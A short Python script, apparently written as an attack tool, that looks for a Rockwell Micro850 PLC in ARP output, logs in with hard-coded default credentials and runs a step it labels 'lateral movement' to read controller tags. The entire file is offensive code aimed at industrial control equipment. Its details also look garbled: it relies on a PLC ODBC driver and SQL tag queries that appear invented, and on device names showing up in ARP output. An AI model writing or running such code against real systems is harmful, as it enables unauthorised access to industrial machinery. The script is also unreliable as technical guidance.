import socket
import pyodbc
import subprocess

# Function to discover the PLC's IP address
def discover_plc_ip():
    # This is a simple example using a network scan. In a real scenario, you might use more sophisticated tools.
    # Here, we use the `arp` command to list all devices on the network.
    result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if 'Micro850' in line:
            ip_address = line.split()[0]
            return ip_address
    return None

# Function to connect to the PLC using default credentials
def connect_to_plc(ip_address, username, password):
    try:
        # Define the connection string
        conn_str = f'DRIVER={{Rockwell Automation PLC Driver}};DEVICE={ip_address};UID={username};PWD={password}'
        
        # Establish the connection
        conn = pyodbc.connect(conn_str)
        print(f"Successfully connected to PLC at {ip_address}")
        return conn
    except pyodbc.Error as e:
        print(f"Failed to connect to PLC at {ip_address}: {e}")
        return None

# Function to perform lateral movement
def perform_lateral_movement(conn):
    try:
        # Example: Read a tag from the PLC
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM [TagName]")
        row = cursor.fetchone()
        if row:
            print(f"Tag value: {row[0]}")
        else:
            print("No data found")
    except pyodbc.Error as e:
        print(f"Failed to perform lateral movement: {e}")

# Main function
def main():
    # Default credentials for Rockwell Micro850 PLC
    default_username = 'admin'
    default_password = 'admin123'  # Replace with actual default credentials

    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("PLC IP address not found")
        return

    # Connect to the PLC using default credentials
    conn = connect_to_plc(plc_ip, default_username, default_password)
    if conn:
        # Perform lateral movement
        perform_lateral_movement(conn)

if __name__ == "__main__":
    main()